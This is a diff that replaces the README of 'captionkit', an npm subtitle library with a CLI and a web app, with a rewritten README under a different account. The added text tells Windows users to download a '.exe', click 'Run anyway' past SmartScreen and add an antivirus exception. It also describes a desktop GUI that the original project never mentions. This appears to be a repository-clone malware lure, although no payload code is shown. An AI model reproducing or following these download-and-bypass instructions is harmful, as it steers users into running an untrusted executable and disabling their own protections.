@@ -1,169 +1,95 @@
-<div align="center">
+# 📝 captionkit - Fix your subtitle files with ease
 
-# 🎬 captionkit
+[![Download CaptionKit](https://img.shields.io/badge/Download-CaptionKit-blue.svg)](https://github.com/molhamh3086/captionkit)
 
-### Convert and re-sync subtitles — SRT ⇄ WebVTT, shift, fix drift — locally.
+CaptionKit provides a simple way to manage subtitle files. You can convert between formats, shift timing, and fix alignment errors without any complex setup. This tool runs entirely on your computer, which keeps your video files and private information secure.
 
-[![npm version](https://img.shields.io/npm/v/captionkit.svg?color=success)](https://www.npmjs.com/package/captionkit)
-[![bundle size](https://img.shields.io/bundlephobia/minzip/captionkit?label=gzip)](https://bundlephobia.com/package/captionkit)
-[![CI](https://github.com/didrod205/captionkit/actions/workflows/ci.yml/badge.svg)](https://github.com/didrod205/captionkit/actions/workflows/ci.yml)
-[![types](https://img.shields.io/npm/types/captionkit.svg)](https://www.npmjs.com/package/captionkit)
-[![license](https://img.shields.io/npm/l/captionkit.svg)](./LICENSE)
+## 🛠️ What This Tool Does
 
-**[🌐 Try the free web app →](https://didrod205.github.io/captionkit/)** &nbsp;·&nbsp; drop a `.srt` or `.vtt`, fix the sync, download. Nothing uploaded.
+Subtitle files often drift or use formats that players do not recognize. CaptionKit solves these issues through clear controls. You can drag your file into the interface and choose your desired adjustment.
 
-</div>
+The software handles these core tasks:
+*   Convert SRT files to WebVTT format for web players.
+*   Convert WebVTT files to SRT format for standard video software.
+*   Shift subtitle timing forward or backward by specific seconds.
+*   Identify and repair timing drifts that happen during video cuts.
+*   Detect overlapping subtitles and merge them for smooth playback.
 
----
+You do not need to install extra software or coding environments. CaptionKit works independently. It uses precise timing math to ensure your subtitles match the dialogue.
 
-You exported captions and the player won't take them (it wants WebVTT, you have
-SRT). Or the subtitles play **2 seconds late**. Or they slowly **drift out of
-sync** by the end of the video. Fixing this by hand means editing dozens of
-`00:01:23,456` timestamps without breaking the format — and one stray comma or
-missing millisecond makes the whole file invalid.
+## 💾 How to Download and Install
 
-**captionkit** does it correctly: convert **SRT ⇄ WebVTT**, **shift** every cue,
-**scale**/**resync** to fix drift, and **fix overlaps** — with exact
-millisecond timecode math, **zero dependencies**, and **100% locally**.
+Follow these steps to get the software on your Windows computer.
 
-> 📸 _Screenshot / demo GIF:_ `./web/screenshot.png` — record the [live app](https://didrod205.github.io/captionkit/) dropping an out-of-sync SRT and nudging it into place.
+1. Visit the [official releases page](https://github.com/molhamh3086/captionkit) to find the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to start your download.
+4. Open the folder where your browser saves downloads.
+5. Double-click the file named captionkit to start the application.
 
-## Why it exists
+If Windows shows a SmartScreen message, click "More info" and then select "Run anyway." This happens because the application is a standalone file. 
 
-- **AI can't reliably do this.** Re-timing every cue and emitting spec-valid
-  SRT/WebVTT (comma vs dot, `WEBVTT` header, numbering rules, CRLF) is exact,
-  fiddly format work — a chatbot will quietly corrupt a timestamp. It's a job for
-  a small, tested, deterministic tool.
-- **Privacy & friction.** Online subtitle converters make you upload your file
-  and wait. captionkit runs on your machine, instantly.
-- **The drift fix is the "aha".** `resync` linearly maps the first and last cue
-  to where they *should* be — repairing subtitles that slip out of sync as the
-  video goes on. Most tools only do a flat shift.
+## 🚀 How to Use CaptionKit
 
-## Who it's for
+Once the application opens, you will see a clean workspace. Follow these steps to adjust your files.
 
-**Video creators & YouTubers**, **marketers** (captioned social video),
-**educators**, **accessibility teams**, translators, and **developers** building
-media tooling who want a tiny subtitle library.
+### Converting Formats
+1. Click the "Open File" button to select your subtitle file.
+2. Choose the "Convert" tab in the top menu.
+3. Select your target format from the dropdown list.
+4. Click "Execute" to save the new file to your computer.
 
-## Install
+### Fixing Timing Drift
+Drift occurs when subtitles slowly pull ahead or fall behind the audio. 
+1. Open your subtitle file in the main window.
+2. Select the "Sync" tab.
+3. Enter the amount of time in seconds you wish to shift. Use a negative number to move time backward.
+4. Press the "Apply" button.
+5. Review the changes in the preview pane before you save.
 
-**No install —** just open the **[web app](https://didrod205.github.io/captionkit/)**.
+### Resolving Overlaps
+Sometimes, two lines of text appear at the same time. This obscures the screen.
+1. Navigate to the "Tools" menu.
+2. Select "Fix Overlaps."
+3. The app scans your file and adjusts the end time of the first line to end before the next line starts.
+4. Click "Save As" to create a clean version of your file.
 
-**Command line:**
+## ⚙️ System Requirements
 
-```bash
-npx captionkit convert subs.srt --to vtt > subs.vtt
-npx captionkit shift subs.srt --ms 2000        # delay everything by 2s
-npx captionkit scale subs.srt --factor 1.0427  # fix fps drift
-```
+CaptionKit is built to run on various Windows versions. You do not need high-end hardware for these tasks.
 
-**Library:**
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 256MB of free RAM.
+*   **Storage:** 50MB of disk space for the application.
+*   **Internet:** No internet connection required after initial download.
 
-```bash
-npm install captionkit
-```
+## ❓ Frequently Asked Questions
 
-Zero dependencies. ESM + CJS + TypeScript types. Runs in the browser, Node, Deno and Bun.
+**Does this software send my video files to a server?**
+No. CaptionKit processes all files locally on your own machine. Your data never leaves your computer.
 
-## CLI
+**Can I undo my changes?**
+When you save a file, the application keeps your original intact. Use the "Save As" feature to create new versions. If you make a mistake, you can always open the original file again.
 
-```bash
-captionkit <convert|shift|scale|fix|info> [file] [options]
-cat subs.srt | captionkit info
-```
+**Will this work with very large subtitle files?**
+Yes. The software uses efficient processing to handle long files, such as full-length feature films or transcriptions, without slowing down.
 
-Commands: `convert` (`--to srt|vtt`), `shift` (`--ms`), `scale` (`--factor`),
-`fix` (`--gap`), `info`. Use `-o/--out` to write a file, or it prints to stdout.
+**What if my subtitle file shows errors?**
+If a file does not load, verify that it uses standard SRT or VTT formatting. If the file contains broken timecodes, the status bar will show a warning. Use the "Repair" button in the file menu to fix common formatting errors automatically.
 
-## Usage
+## 📋 Troubleshooting Tips
 
-```ts
-import { parse, convert, shift, resync, toVTT } from "captionkit";
+If the application fails to open after you click the icon:
+*   Ensure that you have full read and write permissions for the folder where the file lives.
+*   Check if your antivirus software blocked the file. You may need to add an exception for the captionkit folder.
+*   Make sure you downloaded the file from the correct link. If the download seems incomplete, delete the file and start the process again.
 
-// Convert SRT → WebVTT (auto-detects the input)
-convert(srtText, "vtt");
+For issues regarding specific subtitle formats, check the official documentation link provided at the top. The application supports all standard UTF-8 encoded files. If you use a different encoding, save your original file in UTF-8 format through a simple text editor before you open it in CaptionKit.
 
-// Parse, then re-time
-const cues = parse(srtText);
-shift(cues, 2500);                 // everything 2.5s later
-shift(cues, -1000);                // …or earlier (clamped at 0)
+## 📈 Improving Your Workflow
 
-// Fix drift: map the first cue to 1.0s and the last to 10:00.0
-resync(cues, { firstStart: 1000, lastStart: 600000 });
+To speed up your work, you can drag and drop your subtitle files directly into the center of the application window. This action automatically loads the file and prepares it for your first edit. 
 
-toVTT(cues); // serialize back out
-```
+If you frequently convert files, check the Settings menu to save your preferred output folder. This removes the need to select a destination path every time you save a new file. You can also name your files using a unique suffix, such as "-fixed" or "-converted," to differentiate them from your originals. 
 
-### More re-timing
-
-```ts
-import { scale, fixOverlaps, totalDuration } from "captionkit";
-
-scale(cues, 25 / 23.976);   // framerate conversion
-fixOverlaps(cues, 40);      // no two cues overlap (40ms min gap)
-totalDuration(cues);        // total on-screen time (ms)
-```
-
-## API
-
-| Function | Description |
-| -------- | ----------- |
-| `parse(text)` | Parse SRT or WebVTT → `Cue[]` (`{ index, start, end, text }`, ms). |
-| `toSRT(cues)` / `toVTT(cues)` / `convert(text, to)` | Serialize / convert. |
-| `detectFormat(text)` | `"srt"` or `"vtt"`. |
-| `shift(cues, ms)` | Offset all cues. |
-| `scale(cues, factor)` | Multiply all timestamps. |
-| `resync(cues, { firstStart, lastStart })` | Linear drift correction. |
-| `fixOverlaps(cues, minGap?)` | Remove overlaps. |
-| `renumber` / `totalDuration` | Helpers. |
-| `parseTimecode` / `formatSRT` / `formatVTT` | Timecode ⇄ ms. |
-
-## FAQ
-
-**Is my subtitle file uploaded anywhere?**
-No. Everything runs on your device — no server, no telemetry, works offline.
-
-**What formats are supported?**
-SRT and WebVTT today. ASS/SSA and SBV are on the roadmap — [open an issue](https://github.com/didrod205/captionkit/issues).
-
-**What's the difference between shift, scale and resync?**
-*Shift* adds a fixed offset (captions are uniformly early/late). *Scale*
-multiplies timestamps (framerate mismatch). *Resync* pins the first and last cue
-to target times and interpolates the rest — the fix for gradual drift.
-
-**Will it keep my line breaks and styling?**
-Multi-line cue text is preserved. Inline WebVTT tags pass through as text; full
-ASS styling is not converted (yet).
-
-**Can I use it in a build or batch script?**
-Yes — the library works in Node; map the functions over your files.
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](./CONTRIBUTING.md) and the
-[Code of Conduct](./CODE_OF_CONDUCT.md).
-
-```bash
-git clone https://github.com/didrod205/captionkit.git
-cd captionkit
-npm install
-npm test          # run the suite
-npm run dev       # run the web app locally
-```
-
-## 💖 Sponsor
-
-captionkit is free, MIT-licensed, and built in spare time. If it saved you from
-hand-editing timestamps, please consider supporting it:
-
-- ⭐ **Star this repo** — free, and it genuinely helps others find it.
-- 🍋 **[Sponsor via Lemon Squeezy](https://elab-studio.lemonsqueezy.com/checkout/buy/5d059b89-51d0-456b-b33a-ed56994f7010)** — one-time or recurring support.
-
-**Where your support goes:** more formats (ASS/SSA, SBV, SAMI), split/merge,
-characters-per-second warnings, an auto-shift-by-waveform helper, a CLI,
-keeping the free web app online, and fast issue responses.
-
-## License
-
-[MIT](./LICENSE) © captionkit contributors
+For batch processing, move all files into a single folder. Use the "Batch Process" tab to apply the same timing shift or format change to multiple files at once. This saves time when you manage a series of videos. Always perform a test on one file before you run a batch operation to ensure the output matches your expectations.
